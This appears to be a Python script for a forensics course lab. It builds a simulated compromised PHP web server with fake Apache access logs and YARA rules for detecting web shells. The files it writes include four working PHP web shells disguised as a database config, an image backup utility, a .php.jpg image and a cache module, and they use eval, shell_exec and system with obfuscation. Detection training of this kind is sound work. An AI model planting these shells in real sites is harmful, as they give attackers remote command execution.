#!/usr/bin/env python3
"""
generate_webshell_evidence.py - Genera servidor web comprometido con web shells
Curso MAR404 - Clase 10 - Lab 20
"""
import os, json, random
from datetime import datetime, timedelta

EVIDENCE_DIR = "/evidence"
WEBROOT = f"{EVIDENCE_DIR}/var/www/html"
LOGS_DIR = f"{EVIDENCE_DIR}/var/log/apache2"

os.makedirs(WEBROOT, exist_ok=True)
os.makedirs(f"{WEBROOT}/uploads", exist_ok=True)
os.makedirs(f"{WEBROOT}/includes", exist_ok=True)
os.makedirs(f"{WEBROOT}/images", exist_ok=True)
os.makedirs(LOGS_DIR, exist_ok=True)

# === LEGITIMATE FILES ===
with open(f"{WEBROOT}/index.php", "w") as f:
    f.write("""<?php
// Main page - ACME Corp Portal
include('includes/header.php');
echo "<h1>Welcome to ACME Corp</h1>";
include('includes/footer.php');
?>""")

with open(f"{WEBROOT}/includes/header.php", "w") as f:
    f.write("""<?php
// Header template
echo "<html><head><title>ACME Corp</title></head><body>";
echo "<nav>Home | About | Contact</nav>";
?>""")

with open(f"{WEBROOT}/includes/footer.php", "w") as f:
    f.write("""<?php echo "<footer>ACME Corp 2025</footer></body></html>"; ?>""")

# === WEB SHELLS (hidden) ===

# 1. China Chopper (one-liner)
with open(f"{WEBROOT}/includes/config.php", "w") as f:
    f.write("""<?php
// Database configuration
$db_host = 'localhost';
$db_name = 'acme_portal';
$db_user = 'root';
@eval($_POST['password']);
$db_pass = 'S3cur3P@ss!';
?>""")

# 2. Obfuscated web shell in uploads
with open(f"{WEBROOT}/uploads/logo_backup.php", "w") as f:
    f.write("""<?php
// Image backup utility - DO NOT DELETE
$f = str_rot13('riny');
$x = base64_decode($_REQUEST['cmd']);
$f($x);
?>""")

# 3. Web shell disguised as image
with open(f"{WEBROOT}/images/banner.php.jpg", "w") as f:
    f.write("""<?php
if(isset($_GET['c'])){
    $output = shell_exec($_GET['c']);
    echo "<pre>$output</pre>";
}
?>""")

# 4. Sophisticated web shell with auth
with open(f"{WEBROOT}/includes/db_cache.php", "w") as f:
    f.write("""<?php
// Cache management module v2.1
class CacheManager {
    private $key = 'a1b2c3d4e5f6';
    public function process($data) {
        if(md5($_SERVER['HTTP_X_CACHE_KEY']) === '5d41402abc4b2a76b9719d911017c592') {
            $decoded = base64_decode($data);
            return system($decoded);
        }
        return false;
    }
}
if(isset($_POST['cache_data'])) {
    $cm = new CacheManager();
    $cm->process($_POST['cache_data']);
}
?>""")

# === ACCESS LOGS ===
base_time = datetime(2025, 7, 20, 0, 0, 0)
log_entries = []

# Normal traffic
pages = ["/index.php", "/about.php", "/contact.php", "/products.php"]
ips = ["10.0.1.100", "10.0.1.101", "10.0.1.102", "192.168.1.50"]

for i in range(200):
    t = base_time + timedelta(minutes=random.randint(0, 1440))
    ip = random.choice(ips)
    page = random.choice(pages)
    log_entries.append(f'{ip} - - [{t.strftime("%d/%Jul/%Y:%H:%M:%S")} +0000] "GET {page} HTTP/1.1" 200 {random.randint(1000,5000)} "-" "Mozilla/5.0"')

# Malicious access to web shells
attacker_ip = "203.0.113.66"
shell_access_time = base_time + timedelta(hours=14)

# Initial exploitation
log_entries.append(f'{attacker_ip} - - [{shell_access_time.strftime("%d/%Jul/%Y:%H:%M:%S")} +0000] "POST /includes/config.php HTTP/1.1" 200 45 "-" "Mozilla/5.0"')

# Subsequent accesses
for i in range(15):
    t = shell_access_time + timedelta(minutes=random.randint(1, 120))
    shell = random.choice(["/includes/config.php", "/uploads/logo_backup.php", "/includes/db_cache.php"])
    method = "POST"
    log_entries.append(f'{attacker_ip} - - [{t.strftime("%d/%Jul/%Y:%H:%M:%S")} +0000] "{method} {shell} HTTP/1.1" 200 {random.randint(100,2000)} "-" "python-requests/2.28.0"')

# Sort by time
log_entries.sort()

with open(f"{LOGS_DIR}/access.log", "w") as f:
    f.write("\n".join(log_entries))

# === YARA RULES ===
os.makedirs(f"{EVIDENCE_DIR}/yara", exist_ok=True)
with open(f"{EVIDENCE_DIR}/yara/webshells.yar", "w") as f:
    f.write(r"""rule php_webshell_generic {
    meta:
        description = "Detects generic PHP web shells"
        author = "MAR404 Course"
    strings:
        $eval = "eval(" ascii
        $system = "system(" ascii
        $shell_exec = "shell_exec(" ascii
        $passthru = "passthru(" ascii
        $exec = "exec(" ascii
        $base64 = "base64_decode" ascii
        $rot13 = "str_rot13" ascii
        $post = "$_POST" ascii
        $request = "$_REQUEST" ascii
        $get_c = "$_GET['c']" ascii
    condition:
        any of ($eval, $system, $shell_exec, $passthru) and
        any of ($base64, $rot13, $post, $request, $get_c)
}

rule china_chopper {
    meta:
        description = "Detects China Chopper web shell"
    strings:
        $chopper = /@eval\(\$_(POST|REQUEST|GET)\[/ ascii
    condition:
        $chopper
}
""")

print("[+] Web shell evidence generated:")
print(f"    - Webroot: {WEBROOT} (4 web shells hidden)")
print(f"    - Access logs: {LOGS_DIR}/access.log")
print(f"    - YARA rules: {EVIDENCE_DIR}/yara/webshells.yar")
